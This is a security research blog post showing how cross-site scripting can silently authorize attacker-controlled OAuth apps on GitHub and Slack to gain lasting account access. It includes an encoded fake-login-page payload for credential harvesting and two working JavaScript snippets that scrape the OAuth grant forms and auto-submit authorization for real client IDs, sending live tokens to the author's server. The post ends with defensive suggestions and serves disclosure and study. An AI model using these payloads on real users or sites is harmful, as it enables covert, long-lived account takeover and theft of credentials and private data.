
# Advance XSS Persistence With Oauth

When you ask "What's the worst thing that an attacker can do with Cross Site Scripting" in an interview setting, one of the first answers typically given is "You can steal session tokens with `document.cookie`"

While this is technically true for some applications, modern browser features mitigate this with the `httponly` [flag](https://www.owasp.org/index.php/HttpOnly) set by modern applications which prevents Javascript from reading the session token.

Another school of thought is XSS is a complete compromise of one's account or website because of its ability to perform actions and steal data on behalf of a user. While it's true with XSS generally speaking you can perform most actions and read most data on behalf of the user, one major limiting factor is the execution time, which is limited by how long the victim stays on the page. 

What's truly desirable to an attacker is long-lived, unrestricted, undetectable access to a victim's account that persists after the victim closes the page.

To solve this problem, I will propose installing Oauth apps and stealing Oauth credentials with XSS, with no user interaction, and I'll show a few examples of what this looks like on real websites.

### Other persistence options with XSS

Before digging into Oauth, let's go over a few other persistence options. 

As already mentioned, the `httponly` flag is a major limitation for stealing session tokens, but there are other limitations too. Here's a few:

Also limited by: 
+ Short lived sessions
+ Device fingerprinting the application may use
+ The user logging out
### Service Workers
There have been some other interesting tricks to maintain persistence, such abusing XSS and JSONP to [install service workers](https://c0nradsc0rner.com/2016/06/17/xss-persistence-using-jsonp-and-serviceworkers/)

This technique can be used not just with JSONP. More generally if there's arbitrary file upload, or another vector to in some capacity get a Javascript file on the same origin as your XSS entry point, you can install the service worker.

There are some downsides to this method, as follows

+ Hacker complexity (requires precise conditions)
+ Must proxy long lived access through victim
+ Website removing the service worker entry point, kills the persistence
	+ JSONP endpoint removed
	+ File upload sanitized
	+ Endpoints changed around
	+ etc...

### UI Redressing

Another technique is to trick the user into entering credentials via UI redressing. You can use your XSS to make a fake login page on the victim's origin, and modern browser API's let you change and redress the URL bar to look like a login page.

You can do that with the history API:

```javascript
history.replaceState(null, null, '../../../../../login');
```

Let's see what this looks like:

We'll start with a website vulnerable to XSS:

[https://xss-game.appspot.com/level1/frame?query=<script>prompt(1)</script>](https://xss-game.appspot.com/level1/frame?query=<script>prompt(1)</script>)

Next we'll redress the URL so it looks like we've been redirected to the login page:

[https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Ehistory.replaceState%28null%2C%20null%2C%20%27..%2F..%2F..%2Flogin%27%29%3Bdocument.body.innerHTML%20%3D%20%22%3C%2Fbr%3E%3C%2Fbr%3E%3C%2Fbr%3E%3C%2Fbr%3E%3C%2Fbr%3E%3Ch1%3EPlease%20login%20to%20continue%3C%2Fh1%3E%3Cform%3EUsername%3A%20%3Cinput%20type%3D%27text%27%3EPassword%3A%20%3Cinput%20type%3D%27password%27%3E%3C%2Fform%3E%3Cinput%20value%3D%27submit%27%20type%3D%27submit%27%3E%22%3C%2Fscript%3E](https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Ehistory.replaceState%28null%2C%20null%2C%20%27..%2F..%2F..%2Flogin%27%29%3Bdocument.body.innerHTML%20%3D%20%22%3C%2Fbr%3E%3C%2Fbr%3E%3C%2Fbr%3E%3C%2Fbr%3E%3C%2Fbr%3E%3Ch1%3EPlease%20login%20to%20continue%3C%2Fh1%3E%3Cform%3EUsername%3A%20%3Cinput%20type%3D%27text%27%3EPassword%3A%20%3Cinput%20type%3D%27password%27%3E%3C%2Fform%3E%3Cinput%20value%3D%27submit%27%20type%3D%27submit%27%3E%22%3C%2Fscript%3E)

After clicking that link, you should find yourself on `/login`, which actually doesn't exist server side (it'll throw a 500 error if you make a direct request to it). 

![UI redressing XSS window.history](https://i.imgur.com/msQFrRb.png)

This trick also masks the source code for the page. If you click "view source" it will display the source code for `/login` rather than your malicious page.

This trick can be used to harvest credentials, but the obvious downside is the required user interaction.

## Oauth Persistence

### What is Oauth?
Oauth is a mechanism to grant 3rd parties long lived access to your account. We've seen how this can be abused before [via attackers tricking users into clicking the authorize button](https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks/)

By authorizing a 3rd party application, you in affect, give that 3rd party a long lived token that can be used to access your account in different ways.

### Combining with XSS

Here I'll explore using XSS to authorize an attacker generated malicious app without user interaction, that's sole purpose is to maintain long lived access to your account.

Because we're able to perform actions on behalf of the user, as long as the Oauth grant page is hosted on the same origin as the origin we've found XSS, we can install Oauth applications on behalf of our user. Let's see what this looks like. 

### Github Example
First we'll build an Oauth app in Github:

![Oauth XSS](https://i.imgur.com/Sfuhzgs.png)

If you're familiar with Oauth, once the user clicks the authorize button, it grants our server a long lived token access to all the scopes requested.

Github has some protections against certain oauth scopes, forcing users to re-enter credentials if they haven't entered them recently, for those Oauth scopes. For this reason, our app requests scopes that do not require credentials. The scopes are email, and read/write Webhooks. This will allow us to install [Webhooks](https://developer.github.com/webhooks/) on repos on behalf of the user.


Because Github hosts their Oauth grant on their main domain, XSS anywhere on github.com will allow us to Authorize the app on behalf of the user. To simulate this XSS, one can paste the following into their Javascript terminal 
**Warning, this will send my server a live Oauth credential.**

Code to paste:
```javascript
fetch("https://github.com/login/oauth/authorize?client_id=3b46677ca554abcd215a&scope=email,write:repo_hook").then(function(response) {
    response.text().then(function (text) {
        var oauthForm = '<form id="potato" action="/login/oauth/authorize"' + text.split('<form action="/login/oauth/authorize"')[1].split("<button")[0] + '<input name="authorize" value="1"><input type="submit" id="potato"></form>';
        document.write(oauthForm);
		document.getElementById("potato").submit();
    });
  })
  ```

Terminal: 
![Oauth XSS Github](https://i.imgur.com/xhI0blq.png)

And that's pretty much it. The code above installs the Oauth application, and it sends the token to my server. The attacker now has long lived access to the victim's account, and can install webhooks on behalf of the user.

### Slack example

With the same technique we can target slack. The following Javascript code forces you to install an Oauth application in your workspace, given you have permissions to do so:

![Slack Oauth XSS App](https://i.imgur.com/qQVKLT3.png)

Feel free to again simulate the XSS by pasting the below Javascript into your terminal anywhere on your workspace domain.
 **Warning, this will send my server a live Oauth credential.**

```javascript
fetch(location.origin + "/oauth/authorize?scope=channels:history+users.profile:read&client_id=496141141553.514835337734").then(function(response) {
    response.text().then(function (text) {
                var oauthPath = text.split('<noscript><meta http-equiv="refresh" content="0; URL=')[1].split('?')[0];
        fetch(location.origin + oauthPath).then(function(response){
                        response.text().then(function (text) {
                                var crumb = text.split('type="hidden" name="crumb" value="')[1].split('"')[0];
                                var evilForm = `<form id="potatoCarrots" action="${oauthPath}" method="post" accept-encoding="UTF-8"><input type="hidden" name="create_authorization" value="1" /><input type="hidden" name="crumb" value="${crumb}" /></form><script>document.getElementById('potatoCarrots').submit()</script>`

                                document.write(evilForm)
            })
        })
    });
  })
  ```

The above code ran in the context of XSS on your workspace will install an Oauth app with the scope `channel:history`. This grants an attacker long term read access to public channels in your workspace.

## Summary
Installing Oauth applications is a reliable way for attackers to give themselves long term persistence on a victim's account. XSS is a convenient vector to install the application, without the victim knowing.

This serves as a better replacement for the classical `document.cookie`  XSS vector to get long lived account access.

Here is a partial, but incomplete list of websites that support Oauth https://en.wikipedia.org/wiki/List_of_OAuth_providers

### Suggestions

Slack and Github send email notifications to users on app install. This is a good control to notify users something might be wrong.

Github also puts extra controls in place requiring a password be re-entered for sensitive oauth grants. This can be bitter/sweet, as it normalizes users to entering sensitive credentials into the application on a regular basis. For that reason, the above password harvesting technique may be more effective on the user base. That said, prevents this automated Oauth token stealing for those scopes. 

Another effective control would be to move Oauth app grants onto its own subdomain. This limits the attack surface for XSS, as an attacker would need to find an injection point on the same origin, which could be extremely limited in scope to just the Oauth grant.

Some providers, such as Google, already have subdomain seperation of the Oauth grant page. That said, most of the ones I looked at, did not put the Oauth grant page on its own origin.

For this reason, I believe XSS on the same origin as the Oauth grant origin, reflected, stored or DOM, should be treated as considerably higher severity than XSS on origin's that don't host Oauth grants.
